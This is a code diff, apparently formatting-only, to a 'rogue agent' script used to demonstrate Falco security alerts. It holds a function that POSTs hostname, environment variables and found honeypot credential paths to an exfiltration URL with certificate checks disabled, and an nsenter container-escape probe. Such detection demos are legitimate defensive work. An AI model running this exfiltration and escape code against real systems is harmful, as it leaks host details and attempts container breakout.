@@ -54,18 +54,24 @@ def attempt_sensitive_file_read():
 
 def attempt_exfiltration(exfil_url: str):
     """POST stolen data to external endpoint — triggers Falco network alerts."""
-    payload = json.dumps({
-        "hostname": socket.gethostname(),
-        "env": {k: v for k, v in os.environ.items() if k in ("HOME", "USER", "PATH", "HOSTNAME")},
-        "creds_found": [p for p in HONEYPOT_PATHS if os.path.exists(p)],
-    }).encode()
+    payload = json.dumps(
+        {
+            "hostname": socket.gethostname(),
+            "env": {
+                k: v for k, v in os.environ.items() if k in ("HOME", "USER", "PATH", "HOSTNAME")
+            },
+            "creds_found": [p for p in HONEYPOT_PATHS if os.path.exists(p)],
+        }
+    ).encode()
 
     log_event("exfil_attempt", url=exfil_url, payload_size=len(payload))
     try:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        req = urllib.request.Request(exfil_url, data=payload, headers={"Content-Type": "application/json"})
+        req = urllib.request.Request(
+            exfil_url, data=payload, headers={"Content-Type": "application/json"}
+        )
         resp = urllib.request.urlopen(req, timeout=5, context=ctx)
         log_event("exfil_result", status=resp.status)
     except Exception as e:
@@ -121,7 +127,8 @@ def attempt_container_escape_probe():
     try:
         result = subprocess.run(
             ["nsenter", "--target", "1", "--mount", "--", "ls", "/"],
-            capture_output=True, timeout=5,
+            capture_output=True,
+            timeout=5,
         )
         log_event("nsenter_result", rc=result.returncode, stderr=result.stderr.decode()[:200])
     except Exception as e:
@@ -151,10 +158,14 @@ def run_all_attacks(exfil_url: str, delay: float):
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Rogue agent for Falco detection demo — triggers security alerts")
+    parser = argparse.ArgumentParser(
+        description="Rogue agent for Falco detection demo — triggers security alerts"
+    )
     parser.add_argument("--exfil-url", default=DEFAULT_EXFIL_URL, help="Exfiltration target URL")
     parser.add_argument("--delay", type=float, default=2.0, help="Seconds between attack phases")
-    parser.add_argument("--loop", type=int, default=0, help="Loop interval in seconds (0=single run)")
+    parser.add_argument(
+        "--loop", type=int, default=0, help="Loop interval in seconds (0=single run)"
+    )
     args = parser.parse_args()
 
     if args.loop > 0:
